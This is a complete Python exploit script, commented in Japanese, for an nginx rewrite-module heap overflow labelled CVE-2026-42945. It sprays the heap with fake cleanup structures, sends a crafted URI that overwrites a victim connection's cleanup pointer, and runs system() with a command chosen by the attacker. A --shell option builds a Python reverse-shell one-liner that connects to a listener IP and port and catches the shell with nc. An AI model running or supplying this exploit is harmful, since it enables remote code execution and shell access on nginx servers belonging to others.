#!/usr/bin/env python3
"""
CVE-2026-42945 — Nginx-Rift RCE exploit
========================================
対象: nginx 0.6.27 – 1.30.0 (ngx_http_rewrite_module)
条件: ASLR 無効 + 以下の nginx.conf パターン
        rewrite ^/api/(.*)$ /internal?migrated=true;
        set $original_endpoint $1;

---------------------------------------------------------------------------
脆弱性の仕組み (TL;DR)
---------------------------------------------------------------------------
nginx の rewrite スクリプトエンジンは 2 パスで動く:
  Pass 1 (長さ計算): 必要バッファサイズを計算して malloc
  Pass 2 (コピー):   実際にデータをバッファに書き込む

バグ: Pass 1 の sub-engine は is_args=0 で初期化されるが、
      Pass 2 の main engine は is_args=1 (rewrite 置換文字列に '?' が
      含まれるため)。
      is_args=1 の場合、nginx は '+' を '%2B' (1→3バイト) にエスケープする。
      Pass 1 はそのことを知らないので小さすぎるバッファを確保する。
      → Pass 2 で heap overflow が発生。

送るペイロード: GET /api/ + 'A'×349 + '+'×969 + {6バイトアドレス}
  - 計算上の書き込みサイズ: 349 + 969   + 6 = 1324 バイト  (is_args=0 視点)
  - 実際の書き込みサイズ:   349 + 969×3 + 6 = 3262 バイト  (is_args=1 視点)
  - overflow 量:  3262 - 1324 = 1938 バイト

---------------------------------------------------------------------------
攻撃フロー (heap feng shui)
---------------------------------------------------------------------------
1. [Spray]  20 本の POST /spray を開きっぱなしにする。
            各 body の先頭 24 バイトに偽の ngx_pool_cleanup_s 構造体を置く。
            ASLR 無効なので各 body の heap アドレスは固定・既知。

2. [Setup]  2 本の接続を開く:
              attacker_conn: overflow を送る側
              victim_conn:   cleanup ポインタを壊される側

3. [Overflow] attacker_conn で GET /api/AA...++...{addr} を送信。
              ngx_http_script_copy が victim_conn の connection pool 末尾を
              はみ出して書き、cleanup フィールドを spray body のアドレスに書き換える。

4. [Trigger] victim_conn を閉じると nginx が pool cleanup を走らせる。
               cleanup->handler(cleanup->data)
             = system("cmd")  ← RCE

---------------------------------------------------------------------------
アドレスの較正 (Nix build 向け)
---------------------------------------------------------------------------
Ubuntu 22.04 のオリジナル値から以下を変更:
  LIBC_BASE:           0x7ffff77ba000 → 0x7ffff765c000  (glibc 2.40)
  system() offset:     +0x50d70       → +0x52100
  PREREAD_HEAP_OFFSETS: /proc/mem スキャンで実測した body landing address から
                        URI-safe なものだけ抽出 (3 候補)
"""

import argparse
import socket
import struct
import threading
import time
import sys

# ---------------------------------------------------------------------------
# 定数
# ---------------------------------------------------------------------------

SPRAY_BODY_LEN  = 4000   # POST body のバイト数 (nginx pool に乗る上限付近)
N_SPRAY         = 20     # 同時に開く spray 接続数

# ---------------------------------------------------------------------------
# メモリアドレス (ASLR 無効前提、Nix PIE build 向け)
# ---------------------------------------------------------------------------

# nginx binary が PIE base 0x555555554000 にロードされたとき、
# BSS 末尾 (最初の heap 候補) が 0x555555659000 付近に来る
HEAP_BASE = 0x555555659000

# glibc 2.40-66 の ld.so が配置したアドレスと system() シンボルオフセット
LIBC_BASE   = 0x7ffff765c000
SYSTEM_ADDR = LIBC_BASE + 0x52100   # readelf -s libc.so.6 | grep ' system'

# /proc/<worker>/mem スキャンで確認した spray body の landing address のうち
# URI-safe フィルタを通過した候補 (HEAP_BASE + offset = body のアドレス)
# body[2]  @ 0x555555717e47 → offset 0x0bee47
# body[5]  @ 0x555555726877 → offset 0x0cd877
# body[18] @ 0x555555765f47 → offset 0x10cf47
SPRAY_BODY_OFFSETS = [
    0x0bee47,
    0x0cd877,
    0x10cf47,
]

# ---------------------------------------------------------------------------
# URI-safe バイト集合
# ---------------------------------------------------------------------------
# nginx の NGX_ESCAPE_ARGS モードでエスケープされない (= '%XX' に変換されない)
# バイトの集合。overflow ペイロードは URI に埋め込むため、target アドレスの
# 各バイトがここに含まれなければ nginx が書き換えてしまい exploit が失敗する。
#
# 実装: nginx ソースの ngx_uri_chars テーブルと等価なビットマップ。
#   bit = 1 → エスケープ対象 (unsafe)
#   bit = 0 → そのまま通る  (safe)
#
# safe の代表例: A-Z, a-z, 0-9, !$'()*,-./:;@_
# unsafe の例:   NUL, 制御文字, space, ", #, %, &, +, =, ?, 0x80+
_NGX_ESCAPE_ARGS_BITMAP = [
    0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
    0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff,
]
URI_SAFE_BYTES = frozenset(
    byte for byte in range(256)
    if not (_NGX_ESCAPE_ARGS_BITMAP[byte >> 5] & (1 << (byte & 0x1f)))
)


def address_is_uri_safe(addr: int) -> bool:
    """6 バイト (48bit) アドレスの各バイトが URI エスケープされないか確認する。"""
    return all(
        ((addr >> (byte_idx * 8)) & 0xff) in URI_SAFE_BYTES
        for byte_idx in range(6)
    )


def address_to_bytes(addr: int) -> bytes:
    """アドレスを 6 バイトリトルエンディアンに変換 (URI ペイロード埋め込み用)。"""
    return bytes((addr >> (i * 8)) & 0xff for i in range(6))


# ---------------------------------------------------------------------------
# Step 1: Spray body の構築
# ---------------------------------------------------------------------------
# heap 上に以下の偽 ngx_pool_cleanup_s を置く:
#
#   struct ngx_pool_cleanup_s {
#       ngx_pool_cleanup_pt  handler;   // +0  : SYSTEM_ADDR  (system 関数ポインタ)
#       void                *data;      // +8  : cmd_addr      (コマンド文字列の場所)
#       ngx_pool_cleanup_t  *next;      // +16 : NULL
#   };                                  // 合計 24 バイト
#
# その直後 (+24) にコマンド文字列を置く。
# → pool cleanup が呼ばれると handler(data) = system(cmd) が実行される。

def build_spray_body(cmd: str, cmd_addr: int) -> bytes:
    """
    偽 ngx_pool_cleanup_s + コマンド文字列を含む spray body を作る。

    cmd_addr: heap 上でコマンド文字列が置かれるアドレス
              (= spray body の先頭アドレス + 24)
    """
    fake_cleanup_struct = struct.pack(
        '<QQQ',
        SYSTEM_ADDR,  # handler: system()
        cmd_addr,     # data:    コマンド文字列へのポインタ
        0,            # next:    NULL (cleanup チェーン終端)
    )  # 24 バイト

    cmd_bytes = cmd.encode('utf-8') + b'\x00'  # NULL 終端

    body = fake_cleanup_struct + cmd_bytes
    assert len(body) <= SPRAY_BODY_LEN, f"コマンドが長すぎます ({len(body)} > {SPRAY_BODY_LEN})"

    # 残りは任意のパディング
    padding = b'\x41' * (SPRAY_BODY_LEN - len(body))
    return body + padding


# ---------------------------------------------------------------------------
# Step 2: Spray — heap に偽構造体を配置する
# ---------------------------------------------------------------------------
# /spray エンドポイントは backend (server.py) に proxy_pass され、
# X-Delay ヘッダで指定した秒数だけ応答を遅らせる。
# → 接続を閉じるまで nginx は body をメモリに保持し続ける。
# → ASLR 無効なので各接続の pool (body が乗る場所) のアドレスは決定論的。

def send_spray_requests(host: str, port: int, body: bytes) -> list[socket.socket]:
    """N_SPRAY 本の POST /spray を送り、接続を開いたまま返す。"""
    open_connections = []
    for _ in range(N_SPRAY):
        try:
            sock = socket.create_connection((host, port), timeout=5)
            request = (
                b"POST /spray HTTP/1.1\r\n"
                b"Host: l\r\n"
                b"Content-Length: " + str(SPRAY_BODY_LEN).encode() + b"\r\n"
                b"X-Delay: 60\r\n"          # 60 秒応答を遅らせる = body をメモリに留める
                b"Connection: close\r\n"
                b"\r\n"
                + body
            )
            sock.sendall(request)
            open_connections.append(sock)
        except OSError:
            break
        time.sleep(0.005)   # Nginx の accept ループに余裕を持たせる
    return open_connections


def close_all(sockets: list[socket.socket]) -> None:
    for sock in sockets:
        try:
            sock.close()
        except OSError:
            pass


# ---------------------------------------------------------------------------
# Step 3 & 4: Overflow で cleanup ポインタを書き換え、victim 接続で発火
# ---------------------------------------------------------------------------
# overflow ペイロードの構造:
#
#   'A' × 349  : URI-safe なパディング (エスケープされない, 1バイト→1バイト)
#   '+' × 969  : エスケープ対象バイト (1バイト→3バイト '%2B' に展開)
#   {addr} × 6 : target アドレスの 6 バイト (URI-safe であること)
#
#   計算バッファ (is_args=0): 349 + 969×1 + 6 = 1324 バイト
#   実際の書き込み (is_args=1): 349 + 969×3 + 6 = 3262 バイト
#   heap overflow 量: 3262 - 1324 = 1938 バイト
#
# この 1938 バイトのはみ出しが、victim_conn の connection pool の
# cleanup フィールド (pool_start + 40) を target_addr で上書きする。

OVERFLOW_PADDING_SAFE   = 349   # is_args=0/1 どちらでも展開されない 'A'
OVERFLOW_PADDING_ESCAPE = 969   # is_args=1 のとき 3 倍に展開される '+'
# 3262 - 1324 = 1938 バイト overflow → victim pool の cleanup を上書きする

def build_overflow_uri(target_addr: int) -> bytes:
    """
    cleanup ポインタを target_addr に書き換える URI を生成する。
    target_addr は URI-safe であること (address_is_uri_safe で確認済み)。
    """
    addr_bytes = address_to_bytes(target_addr)
    uri_path = (
        "A" * OVERFLOW_PADDING_SAFE
        + "+" * OVERFLOW_PADDING_ESCAPE
        + addr_bytes.decode("latin-1")   # 6 バイトをそのまま URI に埋め込む
    )
    return f"/api/{uri_path}".encode("latin-1")


def attempt_exploit(host: str, port: int, target_addr: int, body: bytes) -> bool:
    """
    1 回の exploit 試行を行い、crash が検出されたら True を返す。

    タイミング戦略:
      attacker_conn を開いてから victim_conn を開くことで、
      victim の connection pool が attacker の request pool の直後に
      割り当てられるようにする (heap 上で隣接)。
      → overflow が victim の cleanup ポインタに届く。
    """

    # --- Spray: heap に偽 cleanup 構造体を配置 ---
    spray_sockets = send_spray_requests(host, port, body)
    time.sleep(0.2)   # nginx が全 body を読み終わるのを待つ

    # --- 2 本の接続を順番に開く ---
    try:
        attacker_conn = socket.create_connection((host, port), timeout=5)
        time.sleep(0.02)
        victim_conn   = socket.create_connection((host, port), timeout=5)
        time.sleep(0.02)
    except OSError:
        close_all(spray_sockets)
        return False

    overflow_uri = build_overflow_uri(target_addr)

    # --- HTTP リクエストを意図的に分割して送る ---
    # attacker_conn: ヘッダを途中で止める (まだ完成させない)
    #   → nginx は request_line を読んだだけでヘッダ待ち状態になる
    attacker_conn.sendall(
        b"GET " + overflow_uri + b" HTTP/1.1\r\n"
        b"Host:localhost\r\n"
    )
    time.sleep(0.05)

    # victim_conn: ヘッダを途中で止める (同様にヘッダ待ち状態)
    victim_conn.sendall(b"GET / HTTP/1.1\r\nHost:localhost\r\n")
    time.sleep(0.05)

    # attacker_conn: 残りのヘッダを送って HTTP リクエストを完成させる
    #   → nginx が rewrite を実行 → overflow 発生 → victim の cleanup を書き換え
    attacker_conn.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
    time.sleep(0.2)

    # --- victim_conn を閉じて pool cleanup を発火させる ---
    # nginx は接続クローズ時に connection pool を解放する。
    # cleanup ポインタが書き換えられていれば system(cmd) が呼ばれる。
    victim_conn.close()
    time.sleep(0.1)

    # --- crash (= system() 実行 → worker プロセス終了) を検出 ---
    crash_detected = False
    try:
        attacker_conn.sendall(b"X-Ping:1\r\n")
        attacker_conn.settimeout(0.2)
        data = attacker_conn.recv(1)
        if not data:
            crash_detected = True   # 接続が切れた = worker が死んだ

    except socket.timeout:
        # タイムアウト = nginx が system() 実行中でブロックされているか、
        # 正常に backend 待ちかを区別するため、別接続で疎通確認する
        try:
            check = socket.create_connection((host, port), timeout=0.2)
            check.sendall(b"GET / HTTP/1.1\r\nHost:localhost\r\nConnection:close\r\n\r\n")
            alive = check.recv(10)
            check.close()
            crash_detected = not alive
        except OSError:
            crash_detected = True

    except (ConnectionResetError, BrokenPipeError, OSError):
        crash_detected = True   # worker が死んで接続リセットされた

    # --- クリーンアップ ---
    close_all(spray_sockets)
    try:
        attacker_conn.close()
    except OSError:
        pass

    return crash_detected


# ---------------------------------------------------------------------------
# ユーティリティ
# ---------------------------------------------------------------------------

def wait_for_nginx(host: str, port: int, timeout_sec: int = 30) -> bool:
    """nginx が応答を返すまで最大 timeout_sec 秒待つ。"""
    for _ in range(timeout_sec):
        try:
            sock = socket.create_connection((host, port), timeout=2)
            sock.sendall(b"GET / HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
            sock.recv(100)
            sock.close()
            return True
        except OSError:
            time.sleep(1)
    return False


# ---------------------------------------------------------------------------
# エントリポイント
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        description="CVE-2026-42945 Nginx-Rift RCE exploit (ASLR 無効環境用)"
    )
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=19321)
    parser.add_argument("--cmd",   help="nginx worker に実行させるシェルコマンド")
    parser.add_argument("--shell", action="store_true",
                        help="リバースシェルを取る (--listen-ip / --listen-port と組み合わせる)")
    parser.add_argument("--listen-ip",   default="172.17.0.1")
    parser.add_argument("--listen-port", type=int, default=1337)
    args = parser.parse_args()

    if not args.cmd and not args.shell:
        parser.error("--cmd か --shell のいずれかが必要です")
    if args.cmd and args.shell:
        parser.error("--cmd と --shell は同時に指定できません")

    host, port = args.host, args.port

    if args.shell:
        cmd = (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{args.listen_ip}\",{args.listen_port}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
        print(f"[*] リバースシェルコマンド: {cmd}")

        def listen_for_shell():
            print(f"[*] {args.listen_port} 番ポートでリバースシェル待機中...")
            import subprocess
            try:
                subprocess.run(["nc", "-l", "-p", str(args.listen_port)], check=True)
            except Exception:
                print(f"[!] nc が使えません。別ターミナルで: nc -l -p {args.listen_port}")

        listener = threading.Thread(target=listen_for_shell, daemon=True)
        listener.start()
        time.sleep(1)
    else:
        cmd = args.cmd

    # URI-safe なアドレス候補を絞り込む
    candidates = [
        (HEAP_BASE + offset, offset)
        for offset in SPRAY_BODY_OFFSETS
        if address_is_uri_safe(HEAP_BASE + offset)
    ]
    if not candidates:
        print("[!] URI-safe な候補アドレスがありません。アドレスを再較正してください。")
        return 1

    # 1 番目の候補アドレスがコマンド文字列の場所になる
    # (全 spray body は同じ内容なので、どの body が使われても cmd_addr は同じ)
    first_candidate_addr = candidates[0][0]
    cmd_addr = first_candidate_addr + 24   # struct の直後にコマンド文字列が来る
    body = build_spray_body(cmd, cmd_addr)

    print(f"[*] target: {host}:{port}")
    print(f"[*] SYSTEM_ADDR = 0x{SYSTEM_ADDR:016x}")
    print(f"[*] 候補アドレス ({len(candidates)} 件): "
          + ", ".join(f"0x{a:x}" for a, _ in candidates))
    print(f"[*] cmd_addr    = 0x{cmd_addr:016x}  (\"{cmd[:40]}...\")" if len(cmd) > 40
          else f"[*] cmd_addr    = 0x{cmd_addr:016x}  (\"{cmd}\")")

    print(f"\n[*] nginx の起動を待っています...")
    if not wait_for_nginx(host, port):
        print("[!] nginx が応答しません")
        return 1
    print("[+] 接続確認 OK\n")

    TRIES_PER_CANDIDATE = 10

    for candidate_addr, offset in candidates:
        target_bytes = address_to_bytes(candidate_addr)
        print(f"[*] 候補 0x{candidate_addr:x} (offset=0x{offset:x}) を試行中...")

        for attempt_num in range(1, TRIES_PER_CANDIDATE + 1):
            # worker が落ちていれば master が再起動するのを待つ
            if not wait_for_nginx(host, port, timeout_sec=10):
                time.sleep(2)
                if not wait_for_nginx(host, port, timeout_sec=10):
                    print("    worker が復帰しません。中断します。")
                    return 1

            crashed = attempt_exploit(host, port, candidate_addr, body)

            if crashed:
                print(f"[+] 試行 {attempt_num}/{TRIES_PER_CANDIDATE}: crash 検出")
                print(f"[+] system(\"{cmd}\") が nginx worker として実行されました")
                if args.shell:
                    print("[*] リバースシェルを待っています (Ctrl-C で終了)...")
                    try:
                        while True:
                            time.sleep(1)
                    except KeyboardInterrupt:
                        pass
                return 0

            time.sleep(0.3)

    print("[-] 全候補を試しましたが crash しませんでした。アドレスを再較正してください。")
    return 1


if __name__ == "__main__":
    sys.exit(main())
